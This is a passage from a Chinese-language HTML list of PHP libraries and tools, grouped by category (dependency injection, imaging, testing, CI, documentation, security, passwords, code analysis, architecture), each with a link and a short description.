<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlcnJlcmEtaW8vcGhwLWZpbGUtbG9jYXRvcg==" title="https://github.com/herrera-io/php-file-locator">PHP File Locator<i class="fa fa-external-link"></i></span> - 一个在大型项目中定位文件的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsY2hlbXktZnIvUEhQLUZGbXBlZy8=" title="https://github.com/alchemy-fr/PHP-FFmpeg/">PHP FFmpeg<i class="fa fa-external-link"></i></span> - 一个用于FFmpeg视频包装的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9jc3Y=" title="https://github.com/thephpleague/csv">CSV<i class="fa fa-external-link"></i></span> - 一个CSV数据操作库</li>
</ul>
<h2 id="流-Stream"><a href="#流-Stream" class="headerlink" title="流( Stream )"></a>流( Stream )</h2><blockquote>
<p>处理流的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z6YW5pbm90dG8vU3RyZWFtZXI=" title="https://github.com/fzaninotto/Streamer">Streamer<i class="fa fa-external-link"></i></span> - 一个简单的面向对象流包装库</li>
</ul>
<h2 id="依赖注入-Dependency-Injection"><a href="#依赖注入-Dependency-Injection" class="headerlink" title="依赖注入( Dependency Injection )"></a>依赖注入( Dependency Injection )</h2><blockquote>
<p>实现依赖注入设计模式的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BpbXBsZS5zZW5zaW9sYWJzLm9yZy8=" title="http://pimple.sensiolabs.org/">Pimple<i class="fa fa-external-link"></i></span> - 一个小的依赖注入容器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbnRhaW5lci1pbnRlcm9w" title="https://github.com/container-interop">container-interop<i class="fa fa-external-link"></i></span> - Containers interoperability</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JkbG93cmV5L0F1cnlu" title="https://github.com/rdlowrey/Auryn">Auryn<i class="fa fa-external-link"></i></span> - 另一个小的依赖注入容器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9jb250YWluZXI=" title="https://github.com/thephpleague/container">Container<i class="fa fa-external-link"></i></span> - 另一个灵活的依赖注入容器</li>
<li><span class="exturl" data-url="aHR0cDovL3BocC1kaS5vcmcv" title="http://php-di.org/">PHP DI<i class="fa fa-external-link"></i></span> - 一个使用标注实现的依赖注入</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5bWZvbnkvRGVwZW5kZW5jeUluamVjdGlvbg==" title="https://github.com/symfony/DependencyInjection">Acclimate<i class="fa fa-external-link"></i></span> - 依赖注入容器和服务定位器的通用接口</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5bWZvbnkvRGVwZW5kZW5jeUluamVjdGlvbg==" title="https://github.com/symfony/DependencyInjection">Symfony DI<i class="fa fa-external-link"></i></span> - 一个的依赖注入组件(SF2)</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhYnBvdC90d2l0dGVl" title="https://github.com/fabpot/twittee">Twittee<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmFjYXN0cy9zaW1wbGUtZGktY29udGFpbmVy" title="https://github.com/laracasts/simple-di-container">simple di container<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcmNlbG9nL0Rpbmc=" title="https://github.com/marcelog/Ding">Ding<i class="fa fa-external-link"></i></span></li>
</ul>
<h2 id="图像-Imagery"><a href="#图像-Imagery" class="headerlink" title="图像( Imagery )"></a>图像( Imagery )</h2><blockquote>
<p>处理图像的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2ltYWdpbmUucmVhZHRoZWRvY3Mub3JnL2VuL2xhdGVzdC9pbmRleC5odG1s" title="http://imagine.readthedocs.org/en/latest/index.html">Imagine<i class="fa fa-external-link"></i></span> - 一个图像处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1N5YmlvL0ltYWdlV29ya3Nob3A=" title="https://github.com/Sybio/ImageWorkshop">PHP Image Workshop<i class="fa fa-external-link"></i></span> - 另一个图像处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ludGVydmVudGlvbi9pbWFnZQ==" title="https://github.com/Intervention/image">Intervention Image<i class="fa fa-external-link"></i></span> - 同样还是一个图像处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1N5YmlvL0dpZkZyYW1lRXh0cmFjdG9y" title="https://github.com/Sybio/GifFrameExtractor">GIF Frame Extractor<i class="fa fa-external-link"></i></span> - 一个提取GIF动画帧信息的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1N5YmlvL0dpZkNyZWF0b3I=" title="https://github.com/Sybio/GifCreator">GIF Creator<i class="fa fa-external-link"></i></span> - 从多幅图片中创建GIF动画的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25tY3RlYW0vaW1hZ2Utd2l0aC10ZXh0" title="https://github.com/nmcteam/image-with-text">Image With Text<i class="fa fa-external-link"></i></span> - 在图像中嵌入文本的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1sb2VwL2NvbG9yLWV4dHJhY3Rvcg==" title="https://github.com/php-loep/color-extractor">Color Extractor<i class="fa fa-external-link"></i></span> - 从图像中提取颜色的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9nbGlkZQ==" title="https://github.com/thephpleague/glide">Glide<i class="fa fa-external-link"></i></span> - 一个按需的图片处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BzbGl3YS9pbWFnZS1vcHRpbWl6ZXI=" title="https://github.com/psliwa/image-optimizer">Image Optimizer<i class="fa fa-external-link"></i></span> - 一个优化图片的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hc3RlcmV4cGxvZGVyL1BIUFRodW1i" title="https://github.com/masterexploder/PHPThumb">PHPThumb<i class="fa fa-external-link"></i></span> - 缩略图处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3QwazRydC9waHBxcmNvZGU=" title="https://github.com/t0k4rt/phpqrcode">phpqrcode<i class="fa fa-external-link"></i></span> - 二维码生成库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuZHJvaWQvUXJDb2Rl" title="https://github.com/endroid/QrCode">QrCode<i class="fa fa-external-link"></i></span> - 另一个二维码生成库</li>
</ul>
<h2 id="测试-Testing"><a href="#测试-Testing" class="headerlink" title="测试( Testing )"></a>测试( Testing )</h2><blockquote>
<p>测试代码库和生成测试数据的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYmFzdGlhbmJlcmdtYW5uL3BocHVuaXQ=" title="https://github.com/sebastianbergmann/phpunit">PHPUnit<i class="fa fa-external-link"></i></span> - 一个单元测试框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYmFzdGlhbmJlcmdtYW5uL2RidW5pdA==" title="https://github.com/sebastianbergmann/dbunit">DBUnit<i class="fa fa-external-link"></i></span> - PHPUnit的代码测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JyaWFuaXVtL3BhcmF0ZXN0" title="https://github.com/brianium/paratest">ParaTest<i class="fa fa-external-link"></i></span> - PHPUnit的并行测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocHNwZWMvcGhwc3BlYw==" title="https://github.com/phpspec/phpspec">PHPSpec<i class="fa fa-external-link"></i></span> - 根据规范的单元测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvZGVjZXB0aW9uL0NvZGVjZXB0aW9u" title="https://github.com/Codeception/Codeception">Codeception<i class="fa fa-external-link"></i></span> - 一个全栈测试框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NvZGVjZXB0aW9uL0FzcGVjdE1vY2s=" title="https://github.com/Codeception/AspectMock">AspectMock<i class="fa fa-external-link"></i></span> - PHPUnit/Codeception的模拟框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F0b3VtL2F0b3Vt" title="https://github.com/atoum/atoum">Atoum<i class="fa fa-external-link"></i></span> - 一个简单的测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhZHJhaWMvbW9ja2VyeQ==" title="https://github.com/padraic/mockery">Mockery<i class="fa fa-external-link"></i></span> - 一个用于测试的模拟对象库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21saXZlbHkvUGhha2U=" title="https://github.com/mlively/Phake">Phake<i class="fa fa-external-link"></i></span> - 另一个用于测试的模拟对象库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocHNwZWMvcHJvcGhlY3k=" title="https://github.com/phpspec/prophecy">Prophecy<i class="fa fa-external-link"></i></span> - 一个强大的模拟框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z6YW5pbm90dG8vRmFrZXI=" title="https://github.com/fzaninotto/Faker">Faker<i class="fa fa-external-link"></i></span> - 一个伪数据生成库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hdXJpcy9zYW1zdWk=" title="https://github.com/mauris/samsui">Samsui<i class="fa fa-external-link"></i></span> - 另一个伪数据生成库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25lbG1pby9hbGljZQ==" title="https://github.com/nelmio/alice">Alice<i class="fa fa-external-link"></i></span> - 用于生成复杂数据的库</li>
<li><span class="exturl" data-url="aHR0cDovL2JlaGF0Lm9yZy8=" title="http://behat.org/">Behat<i class="fa fa-external-link"></i></span> - 一个行为驱动开发（BDD）的测试框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbHN0anVsZXMvcGhv" title="https://github.com/danielstjules/pho">Pho<i class="fa fa-external-link"></i></span> - 另一个行为驱动开发的测试框架</li>
<li><span class="exturl" data-url="aHR0cDovL21pbmsuYmVoYXQub3JnLw==" title="http://mink.behat.org/">Mink<i class="fa fa-external-link"></i></span> - Web验收测试</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ludGVyTmF0aW9ucy9odHRwLW1vY2s=" title="https://github.com/InterNations/http-mock">HTTP Mock<i class="fa fa-external-link"></i></span> - 一个在单元测试中模拟HTTP请求的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pa2V5MTc5L3Zmc1N0cmVhbQ==" title="https://github.com/mikey179/vfsStream">VFS Stream<i class="fa fa-external-link"></i></span> - 一个用于测试的虚拟文件系统流包装</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkbGF3c29uL3Zmcy5waHA=" title="https://github.com/adlawson/vfs.php">VFS<i class="fa fa-external-link"></i></span> - 另一个用于测试的虚拟文件系统</li>
<li><span class="exturl" data-url="aHR0cDovL2xvY3VzdC5pby8=" title="http://locust.io/">Locust<i class="fa fa-external-link"></i></span> - 一个Python开发的现代负载测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Blcmlkb3QtcGhwL3Blcmlkb3Q=" title="https://github.com/peridot-php/peridot">Peridot<i class="fa fa-external-link"></i></span> - 一个事件驱动的测试框架</li>
</ul>
<h2 id="持续集成-Continuous-Integration"><a href="#持续集成-Continuous-Integration" class="headerlink" title="持续集成( Continuous Integration )"></a>持续集成( Continuous Integration )</h2><blockquote>
<p>持续集成的库和应用</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly90cmF2aXMtY2kub3JnLw==" title="https://travis-ci.org/">Travis CI<i class="fa fa-external-link"></i></span> - 一个持续集成的平台</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZW1hcGhvcmVhcHAuY29tLw==" title="https://semaphoreapp.com/">SemaphoreCI<i class="fa fa-external-link"></i></span> - 一个给开源程序和私有项目的持续集成平台</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5waHB0ZXN0aW5nLm9yZy8=" title="http://www.phptesting.org/">PHPCI<i class="fa fa-external-link"></i></span> - 一个PHP的开源持续集成平台</li>
<li><span class="exturl" data-url="aHR0cDovL3Npc21vLnNlbnNpb2xhYnMub3JnLw==" title="http://sismo.sensiolabs.org/">Sismo<i class="fa fa-external-link"></i></span> - 一个持续的测试服务器库</li>
<li><span class="exturl" data-url="aHR0cDovL2plbmtpbnMtY2kub3JnLw==" title="http://jenkins-ci.org/">Jenkins<i class="fa fa-external-link"></i></span> - PHP支持的持续集成平台</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvbGljb2RlL0pvbGlDaQ==" title="https://github.com/jolicode/JoliCi">JoliCi<i class="fa fa-external-link"></i></span> - PHP开发的由Docker支持的持续集成客户端</li>
</ul>
<h2 id="文档-Documentation"><a href="#文档-Documentation" class="headerlink" title="文档( Documentation )"></a>文档( Documentation )</h2><blockquote>
<p>生成项目文档的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhYnBvdC9TYW1p" title="https://github.com/fabpot/Sami">Sami<i class="fa fa-external-link"></i></span> - 一个API文档生成器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FwaWdlbi9hcGlnZW4=" title="https://github.com/apigen/apigen">APIGen<i class="fa fa-external-link"></i></span> - 另一个API文档生成器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocERvY3VtZW50b3IvcGhwRG9jdW1lbnRvcjI=" title="https://github.com/phpDocumentor/phpDocumentor2">PHP Documentor 2<i class="fa fa-external-link"></i></span> - 文档生成器</li>
<li><span class="exturl" data-url="aHR0cDovL3BocGRveC5kZS8=" title="http://phpdox.de/">phpDox<i class="fa fa-external-link"></i></span> - 一个PHP项目的文档生成器（不仅仅是API文档）</li>
</ul>
<h2 id="安全-Security"><a href="#安全-Security" class="headerlink" title="安全( Security )"></a>安全( Security )</h2><blockquote>
<p>用于生成安全的随机数、加密数据、扫描漏洞, 令牌的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V6eWFuZy9odG1scHVyaWZpZXI=" title="https://github.com/ezyang/htmlpurifier">HTML Purifier<i class="fa fa-external-link"></i></span> - 一个标准的HTML过滤器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9SYW5kb21MaWI=" title="https://github.com/ircmaxell/RandomLib">RandomLib<i class="fa fa-external-link"></i></span> - 生成随机数和随机字符串的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BpeGVsb3V0aW9uL3RydWUtcmFuZG9t" title="https://github.com/pixeloution/true-random">True Random<i class="fa fa-external-link"></i></span> - 使用<span class="exturl" data-url="aHR0cDovL3d3dy5yYW5kb20ub3Jn55Sf5oiQ6ZqP5py65pWw55qE5bqT" title="http://www.random.org生成随机数的库">www.random.org生成随机数的库<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhZHJhaWMvU2VjdXJpdHlNdWx0aVRvb2w=" title="https://github.com/padraic/SecurityMultiTool">SecurityMultiTool<i class="fa fa-external-link"></i></span> - 一个PHP安全库</li>
<li><span class="exturl" data-url="aHR0cDovL3BocHNlY2xpYi5zb3VyY2Vmb3JnZS5uZXQv" title="http://phpseclib.sourceforge.net/">PHPSecLib<i class="fa fa-external-link"></i></span> - 一个纯的PHP安全通信库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpbW9oNi9UQ3J5cHRv" title="https://github.com/timoh6/TCrypto">TCrypto<i class="fa fa-external-link"></i></span> - 一个简单的键值加密存储库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUElEUy9QSFBJRFM=" title="https://github.com/PHPIDS/PHPIDS">PHP IDS<i class="fa fa-external-link"></i></span> - 一个结构化的PHP安全层</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hlcnp1bHQvcGhwLXNzaA==" title="https://github.com/Herzult/php-ssh">PHP SSH<i class="fa fa-external-link"></i></span> - 面向对象的SSH包装库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BzZWNpby9pbmlzY2Fu" title="https://github.com/psecio/iniscan">IniScan<i class="fa fa-external-link"></i></span> - 一个扫描PHP INI文件安全的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eS5zZW5zaW9sYWJzLm9yZy8=" title="https://security.sensiolabs.org/">SensioLabs Security Check<i class="fa fa-external-link"></i></span> -  一个根据安全建议检查Composer依赖的Web工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9PV0FTUF9aZWRfQXR0YWNrX1Byb3h5X1Byb2plY3Q=" title="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">Zed<i class="fa fa-external-link"></i></span> - 用于Web应用的集成渗透测试工具</li>
<li><span class="exturl" data-url="aHR0cDovL2p3dC5pby8=" title="http://jwt.io/">JSON Web Token<i class="fa fa-external-link"></i></span>- JSON网络令牌库<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpcmViYXNlL3BocC1qd3Q=" title="https://github.com/firebase/php-jwt">php-jwt<i class="fa fa-external-link"></i></span> </li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xjb2J1Y2NpL2p3dA==" title="https://github.com/lcobucci/jwt">jwt<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hbXNoaS9qb3Nl" title="https://github.com/namshi/jose">jose<i class="fa fa-external-link"></i></span> - JSON签名和加密的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FraXJrL3BocC1yYXRlbGltaXRlcg==" title="https://github.com/akirk/php-ratelimiter">php-ratelimiter<i class="fa fa-external-link"></i></span> </li>
</ul>
<h2 id="密码-Passwords"><a href="#密码-Passwords" class="headerlink" title="密码( Passwords )"></a>密码( Passwords )</h2><blockquote>
<p>处理和存储密码的库和工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9wYXNzd29yZF9jb21wYXQ=" title="https://github.com/ircmaxell/password_compat">Password Compat<i class="fa fa-external-link"></i></span> - 一个用于新的PHP5.5密码功能的兼容库</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5vcGVud2FsbC5jb20vcGhwYXNzLw==" title="http://www.openwall.com/phpass/">phpass<i class="fa fa-external-link"></i></span> - 一个便携式密码哈希框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9QSFAtUGFzc3dvcmRMaWI=" title="https://github.com/ircmaxell/PHP-PasswordLib">PHP Password Lib<i class="fa fa-external-link"></i></span> - 一个用于生成和验证密码的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9wYXNzd29yZC1wb2xpY3k=" title="https://github.com/ircmaxell/password-policy">Password Policy<i class="fa fa-external-link"></i></span> - 一个PHP和JavaScript的密码规则库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plcmVteWtlbmRhbGwvcGFzc3dvcmQtdmFsaWRhdG9y" title="https://github.com/jeremykendall/password-validator">Password Validator<i class="fa fa-external-link"></i></span> - 验证和升级密码哈希的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JqZWF2b25zL3p4Y3Zibi1waHA=" title="https://github.com/bjeavons/zxcvbn-php">Zxcvbn PHP<i class="fa fa-external-link"></i></span> - 一个基于Zxcvbn JS的PHP显示密码强度估计库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpbW9oNi9HZW5QaHJhc2U=" title="https://github.com/timoh6/GenPhrase">GenPhrase<i class="fa fa-external-link"></i></span> - 一个生成安全随机口令的库</li>
</ul>
<h2 id="代码分析-Code-Analysis"><a href="#代码分析-Code-Analysis" class="headerlink" title="代码分析( Code Analysis )"></a>代码分析( Code Analysis )</h2><blockquote>
<p>用于分析、解析和操作代码库的工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pa2ljL1BIUC1QYXJzZXI=" title="https://github.com/nikic/PHP-Parser">PHP Parser<i class="fa fa-external-link"></i></span> - 一个PHP编写的PHP解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9QSFBQSFA=" title="https://github.com/ircmaxell/PHPPHP">PHPPHP<i class="fa fa-external-link"></i></span> - 一个PHP实现的PHP虚拟机</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpZXJ5cHJvcGhldC9waHAtc2FuZGJveA==" title="https://github.com/fieryprophet/php-sandbox">PHPSandbox<i class="fa fa-external-link"></i></span> - PHP的沙盒环境</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pha3VibGVkbC9kaXNzZWN0" title="https://github.com/jakubledl/dissect">Dissect<i class="fa fa-external-link"></i></span> - 词法和语法分析的工具集合</li>
<li><span class="exturl" data-url="aHR0cDovL3BocG1kLm9yZy8=" title="http://phpmd.org/">PHP Mess Detector<i class="fa fa-external-link"></i></span> - 一个扫描代码bug、次佳代码和未使用参数的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxdWl6bGFicy9QSFBfQ29kZVNuaWZmZXI=" title="https://github.com/squizlabs/PHP_CodeSniffer">PHP Code Sniffer<i class="fa fa-external-link"></i></span> - 一个检测PHP、CSS和JS代码标准冲突的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYmFzdGlhbmJlcmdtYW5uL3BocGNwZA==" title="https://github.com/sebastianbergmann/phpcpd">PHPCPD<i class="fa fa-external-link"></i></span> - 一个检测复制和粘贴代码的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjcnV0aW5pemVyLWNpL3BocC1hbmFseXplcg==" title="https://github.com/scrutinizer-ci/php-analyzer">PHP Analyser<i class="fa fa-external-link"></i></span> - 一个分析PHP代码中错误的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZyaWVuZHNPZlBIUC9QSFAtQ1MtRml4ZXI=" title="https://github.com/FriendsOfPHP/PHP-CS-Fixer">PHP CS Fixer<i class="fa fa-external-link"></i></span> - 一个代码标准库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaG1pdHRqb2gvcGhwLW1hbmlwdWxhdG9y" title="https://github.com/schmittjoh/php-manipulator">PHP Manipulator<i class="fa fa-external-link"></i></span> - 用于分析和修改PHP源代码的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hhbGxlY2s0NS9QaHBNZXRyaWNz" title="https://github.com/Halleck45/PhpMetrics">PHP Metrics<i class="fa fa-external-link"></i></span> - 一个静态测量库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1FhZm9vTGFicy9waHAtcmVmYWN0b3JpbmctYnJvd3Nlcg==" title="https://github.com/QafooLabs/php-refactoring-browser">PHP Refactoring Browser<i class="fa fa-external-link"></i></span> - 一个用于重构PHP代码的命令行工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbXp4L3BocC1zZW12ZXItY2hlY2tlcg==" title="https://github.com/tomzx/php-semver-checker">php-semver-checker<i class="fa fa-external-link"></i></span> - 一个版本对比的命令行工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RldnN0ZXIvdWJlbmNo" title="https://github.com/devster/ubench">UBench<i class="fa fa-external-link"></i></span> - 一个简单的小型基准测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BvbHlmcmFjdGFsL2F0aGxldGlj" title="https://github.com/polyfractal/athletic">Athletic<i class="fa fa-external-link"></i></span> - 一个基于标注的基准测试库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RyaXNtZWdpc3RlL01vbmRyaWFu" title="https://github.com/Trismegiste/Mondrian">Mondrian<i class="fa fa-external-link"></i></span> - 使用图论的代码分析工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zY3J1dGluaXplci1jaS5jb20v" title="https://scrutinizer-ci.com/">Scrutinizer<i class="fa fa-external-link"></i></span> - 检查PHP代码的Web工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYmFzdGlhbmJlcmdtYW5uL3BocGxvYw==" title="https://github.com/sebastianbergmann/phploc">PHPLOC<i class="fa fa-external-link"></i></span> - 一个快速评估PHP项目大小的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2picm9va3N1ay9waHBjaGVja3N0eWxl" title="https://github.com/jbrooksuk/phpcheckstyle">PHPCheckstyle<i class="fa fa-external-link"></i></span> - 一个帮助遵守特定代码规则的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hbXV6L1BocERlcGVuZGVuY3lBbmFseXNpcw==" title="https://github.com/mamuz/PhpDependencyAnalysis">PhpDependencyAnalysis<i class="fa fa-external-link"></i></span> - 一个创建可定制型依赖关系图表的工具</li>
<li><span class="exturl" data-url="aHR0cDovL2NvZGVjbGltYXRlLmNvbS8=" title="http://codeclimate.com/">Code Climate<i class="fa fa-external-link"></i></span> - 自动化的code review</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvc2VwaExlbnRvbi9QSFAtRXJyb3I=" title="https://github.com/JosephLenton/PHP-Error">PHP Error<i class="fa fa-external-link"></i></span> - 用于转换标准的 PHP 错误信息，主要用于开发过程中的调试</li>
</ul>
<h2 id="结构-Architectural"><a href="#结构-Architectural" class="headerlink" title="结构( Architectural )"></a>结构( Architectural )</h2><blockquote>
<p>有关于设计模式,编程规范以及代码组织方式的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaG1pdHRqb2gvcGhwLW9wdGlvbg==" title="https://github.com/schmittjoh/php-option">PHP Option<i class="fa fa-external-link"></i></span> - 一个PHP选项类型的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvYnRoZWNvdy9SdWxlcg==" title="https://github.com/bobthecow/Ruler">Ruler<i class="fa fa-external-link"></i></span> - 一个简单的无状态的产生环境规则的引擎</li>
<li><span class="exturl" data-url="aHR0cDovL3lvaGFuLmdpYXJlbC5saS9GaW5pdGU=" title="http://yohan.giarel.li/Finite">Finite<i class="fa fa-external-link"></i></span> - 一个简单的PHP有限状态机</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lnb3J3L2NvbXBvc2U=" title="https://github.com/igorw/compose">Compose<i class="fa fa-external-link"></i></span> - 一个功能组合库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9tb25hZC1waHA=" title="https://github.com/ircmaxell/monad-php">Monad PHP<i class="fa fa-external-link"></i></span> - 一个简单Monad库</li>
<li><span class="exturl" data-url="aHR0cDovL2FudGVjZWRlbnQuZ2l0aHViLmlvL3BhdGNod29yay8=" title="http://antecedent.github.io/patchwork/">Patchwork<i class="fa fa-external-link"></i></span> - 一个重新定义用户的函数库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuZGVsL2dhbGFwYWdvcw==" title="https://github.com/endel/galapagos">Galapagos<i class="fa fa-external-link"></i></span> - 语言转换进化</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvbW5pa2wvRGVzaWduUGF0dGVybnNQSFA=" title="https://github.com/domnikl/DesignPatternsPHP">Design Patterns PHP<i class="fa fa-external-link"></i></span> - 一个使用PHP实现的设计模式实例库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xzdHJvam55L2Z1bmN0aW9uYWwtcGhw" title="https://github.com/lstrojny/functional-php">Functional PHP<i class="fa fa-external-link"></i></span> - 一个函数式编程库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BoaW5lL2xpYi1hY2Nlc3Nvcg==" title="https://github.com/phine/lib-accessor">Lib Accessor<i class="fa fa-external-link"></i></span> - 一个简化访问的库</li>
